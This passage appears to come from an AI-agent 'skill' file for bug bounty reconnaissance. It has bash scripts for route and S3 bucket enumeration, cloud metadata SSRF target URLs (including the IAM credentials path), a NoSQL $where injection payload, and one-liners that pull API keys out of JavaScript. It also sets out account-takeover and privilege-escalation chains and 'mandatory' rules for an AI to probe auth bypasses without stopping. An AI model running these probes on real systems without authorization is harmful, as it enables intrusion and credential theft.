for path in /_routes /routes /endpoints /paths /api/_routes /__routes; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path")
  echo "[$STATUS] $TARGET$path"
done

# Node.js debug mode
curl -sk "$TARGET/node_modules/.bin/"
curl -sk "$TARGET/node_modules/"

# Process env exposure
curl -sk -X POST "$TARGET/api/" -H "Content-Type: application/json" -d '{"$where":"function(){return true}"}'
```

### 7.3 — Django / Python Deep Enumeration

```bash
TARGET="https://TARGET"

# Django debug mode — HUGE info leak
curl -sk "$TARGET/TRIGGER_404_INTENTIONALLY_12345"
# If DEBUG=True, you'll see ALL URL patterns in error page

# Common Django paths
for path in /admin/ /admin/login/ /api/ /api/schema/ /api/docs/ /__debug__/ /silk/ /rosetta/ /grappelli/; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path")
  echo "[$STATUS] $TARGET$path"
done

# DRF (Django REST Framework) browsable API
curl -sk "$TARGET/api/" -H "Accept: text/html"

# Django REST framework schema
curl -sk "$TARGET/api/schema/"
curl -sk "$TARGET/api/schema/?format=json"
```

### 7.4 — AWS / Cloud Infrastructure

```bash
TARGET="https://TARGET"
DOMAIN=$(echo $TARGET | sed 's|https\?://||' | sed 's|/.*||')

# Check for AWS services in DNS
dig CNAME $DOMAIN
dig A $DOMAIN +short

# Common S3 bucket patterns
BUCKETS=(
  "$DOMAIN"
  "${DOMAIN//\./-}"
  "www.$DOMAIN"
  "assets.$DOMAIN"
  "static.$DOMAIN"
  "media.$DOMAIN"
  "files.$DOMAIN"
  "uploads.$DOMAIN"
  "backup.$DOMAIN"
  "dev.$DOMAIN"
  "staging.$DOMAIN"
)

for bucket in "${BUCKETS[@]}"; do
  # Check if public
  STATUS=$(curl -sk -o /tmp/s3.xml -w "%{http_code}" "https://$bucket.s3.amazonaws.com/")
  if [ "$STATUS" != "403" ] && [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ]; then
    echo "[S3 $STATUS] https://$bucket.s3.amazonaws.com/"
    cat /tmp/s3.xml | grep -oE '<Key>[^<]+</Key>' | head -20
  fi
done

# Check for SSRF via metadata
# (only test on endpoints that make server-side requests)
METADATA_URLS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://metadata.google.internal/computeMetadata/v1/"
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
)
```

---

## ═══════════════════════════════════════
## PHASE 8 — CHAINING FOR HIGH IMPACT
## ═══════════════════════════════════════

### 8.1 — Impact Chain Examples

```
CHAIN 1: Info Leak → Auth Bypass → Account Takeover
  Step 1: Find /api/v1/users endpoint leaking user IDs
  Step 2: Find /api/v1/auth/reset using predictable token
  Step 3: Reset admin password → ATO
  Impact: P1 Critical

CHAIN 2: JS File → Hidden Endpoint → IDOR
  Step 1: Read app.js → find /api/internal/reports/{id}
  Step 2: Enumerate IDs → access other users' reports
  Step 3: Reports contain PII → Data breach
  Impact: P2 High

CHAIN 3: Swagger Spec → Parameter Pollution → Privilege Escalation
  Step 1: Find /api-docs.json with all endpoints
  Step 2: Find admin-only parameter in user endpoint
  Step 3: Add "role":"admin" to regular user request
  Step 4: Access admin functionality
  Impact: P1 Critical

CHAIN 4: .env Exposure → Database Creds → Full Compromise
  Step 1: Find /.env exposed
  Step 2: Extract DATABASE_URL with credentials
  Step 3: If port open → direct DB access
  Impact: P1 Critical

CHAIN 5: GraphQL Introspection → Hidden Mutation → Horizontal Priv Esc
  Step 1: GET /graphql introspection enabled
  Step 2: Find "transferOwnership" mutation not in UI
  Step 3: Transfer victim's account resources
  Impact: P1 Critical
```

### 8.2 — Valid vs Invalid Finding Decision Tree

```
FINDING VALIDATION CHECKLIST:

□ Can I reproduce it with a fresh curl command?
□ Does the HTTP response body confirm the vulnerability?
□ Is there a clear security impact (data leak / auth bypass / code exec)?
□ Is this in scope per the program's rules?
□ Is it NOT a self-XSS / localhost-only / theoretical issue?
□ Did I test it on a real account/resource (not a test dummy that returns fake data)?
□ Can I show the FULL request and response as proof?
□ Is the impact measurable (which data? which users? what access level?)
□ Is this NOT already known/reported (check program's known issues)?

IF ALL CHECKED = REPORT IT
IF ANY UNCHECKED = DO NOT REPORT — INVESTIGATE MORE FIRST
```

---

## ═══════════════════════════════════════
## PHASE 9 — AI EXECUTION INSTRUCTIONS
## ═══════════════════════════════════════

### 9.1 — Mandatory AI Behavior Rules

```
WHEN GIVEN A TARGET DOMAIN, THE AI MUST:

[STEP 1] CREATE KNOWLEDGE.md immediately (empty template)
[STEP 2] Run Phase 1 — Full header fingerprint, log all results
[STEP 3] Extract all JS files from homepage, log in KNOWLEDGE.md
[STEP 4] Analyze EVERY JS file — extract endpoints, secrets, patterns
[STEP 5] Add all discovered endpoints to KNOWLEDGE.md
[STEP 6] Run tech-specific checks based on fingerprinted stack
[STEP 7] Test admin/sensitive paths based on discovered tech
[STEP 8] Run API spec discovery (Swagger/GraphQL)
[STEP 9] For every endpoint found → test auth bypasses
[STEP 10] For every auth-protected endpoint → test 403 bypasses
[STEP 11] Identify IDOR opportunities and test sequentially
[STEP 12] Test all rate limiting weaknesses
[STEP 13] Look for chains between findings
[STEP 14] Update KNOWLEDGE.md continuously
[STEP 15] NEVER report without proof — validate every finding first
[STEP 16] If stuck → search for new techniques for this specific tech
[STEP 17] Apply new techniques → go deeper
[STEP 18] NEVER STOP until all branches exhausted

FORBIDDEN ACTIONS:
✗ NEVER report a finding without a valid HTTP 200/non-error response proof
✗ NEVER assume a vulnerability exists without testing it
✗ NEVER test out-of-scope targets
✗ NEVER generate load / DoS conditions
✗ NEVER access data beyond what proves the vulnerability exists
✗ NEVER stop after finding 1 thing — always look for chains
✗ NEVER ignore error messages — they contain intelligence
✗ NEVER skip header analysis — it's free intelligence
✗ NEVER skip JS analysis — it's the richest source of hidden endpoints
```

### 9.2 — Continuous Self-Improvement Loop

```
AFTER EACH RECONNAISSANCE SESSION:

1. What new endpoints did I find? → Add to KNOWLEDGE.md
2. What tech patterns did I see for the first time? → Log and learn
3. What bypasses worked? → Prioritize in next session
4. What bypasses failed? → Don't retry, mark as ineffective
5. What would an attacker chain next? → Plan next moves
6. What public CVEs/techniques exist for this specific tech version? → Research
7. What did I miss in this session? → Build checklist for next time
8. What was the highest-impact finding? → Why? What pattern led there?

SEARCH QUERIES TO RUN WHEN STUCK:
- "[FRAMEWORK] [VERSION] hidden endpoints bug bounty"
- "[FRAMEWORK] authentication bypass 2024 2025"  
- "[FRAMEWORK] IDOR techniques"
- "[API GATEWAY] bypass techniques"
- "site:hackerone.com [TECHNOLOGY] disclosure"
- "site:huntr.dev [TECHNOLOGY]"
- "[TECHNOLOGY] CVE 2024 2025"
```

---

## ═══════════════════════════════════════
## PHASE 10 — QUICK REFERENCE CHEATSHEET
## ═══════════════════════════════════════

### One-Liner Power Commands

```bash
# Full endpoint extraction from live site
curl -sk "https://TARGET" | grep -oE '(href|src|action)="[^"]*"' | sed 's/href="//;s/src="//;s/action="//;s/"//' | sort -u

# Find all unique paths from JS
curl -sk "https://TARGET/app.js" | grep -oE '"\/[a-zA-Z0-9/_-]+"' | sort -u

# Extract API keys from JS
curl -sk "https://TARGET/app.js" | grep -oiE '(api[_-]?key|token|secret)["\s:=]+[A-Za-z0-9+/=_-]{20,}'

# Test all HTTP methods on endpoint
for m in GET POST PUT PATCH DELETE OPTIONS HEAD; do echo -n "[$m] "; curl -sk -X $m -o /dev/null -w "%{http_code}" "https://TARGET/api/"; echo; done

# Find exposed git
curl -sk "https://TARGET/.git/HEAD" | grep -q "ref:" && echo "GIT EXPOSED"

# Check for Spring Actuator
curl -sk "https://TARGET/actuator/env" | python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key"

# Extract endpoints from Swagger
curl -sk "https://TARGET/api-docs" | python3 -c "import json,sys;[print(k) for k in json.load(sys.stdin).get('paths',{}).keys()]"

# Wayback Machine endpoint discovery
curl -sk "https://web.archive.org/cdx/search/cdx?url=TARGET/*&output=text&fl=original&collapse=urlkey&matchType=prefix" | grep -E "\.json|\.php|api|admin" | sort -u

# robots.txt intelligence
curl -sk "https://TARGET/robots.txt" | grep "Disallow" | sed 's/Disallow: //'
```

---

## ═══════════════════════════════════════
## APPENDIX — KNOWLEDGE.md GENERATION COMMAND
## ═══════════════════════════════════════

When starting recon on a new target, the AI must immediately run:

```bash
TARGET="https://TARGET_DOMAIN"
DOMAIN=$(echo $TARGET | sed 's|https\?://||' | sed 's|/.*||')
DATE=$(date '+%Y-%m-%d %H:%M:%S')

cat > KNOWLEDGE.md << EOF
# KNOWLEDGE.md — Bug Bounty Intelligence
# Target: $DOMAIN
# Started: $DATE
# Status: ACTIVE INVESTIGATION

---
## CONFIRMED TECH STACK
[TO BE FILLED]

## DISCOVERED ENDPOINTS (VALID ONLY)
[TO BE FILLED]

## JS FILES ANALYZED
[TO BE FILLED]

## SENSITIVE FILES FOUND
[TO BE FILLED]

## AUTH BYPASSES TESTED
[TO BE FILLED]

## VALID FINDINGS (WITH PROOF)
[TO BE FILLED]

## ATTACK CHAINS IDENTIFIED
[TO BE FILLED]

## NEXT ACTIONS
[TO BE FILLED]

## FAILED ATTEMPTS (DO NOT RETRY)
[TO BE FILLED]
EOF

echo "KNOWLEDGE.md created. Starting Phase 1 reconnaissance..."
```

---

*This skill is intended exclusively for authorized bug bounty hunting on targets where the researcher has explicit written permission or the target is listed in a valid bug bounty program (HackerOne, Bugcrowd, Intigriti, Synack, or a private program). Unauthorized use against systems without permission is illegal.*

*Last Updated: 2026 | Version: 2.0 | Focus: Valid Findings Only, Zero False Positives*

MAKE ALL SKILL VERY DETAILED WITH MOR EIN DEPTH USE MORE IN DEPTH SEARCHING GOOGLE AND ADD IN THAT SKILLS AND ALONG WITH THAT START ON THIS FINDDING HIDDEN STUFF VERY DEPTH 

CURL THIS 

MAKE ALL SKILL WHILE DOINF CURL OF THIS FIRST AND ON THE BASIS OF THAT MAKE SKILLS ONE BY ONE AND INSTANT USED IN DEPTH 
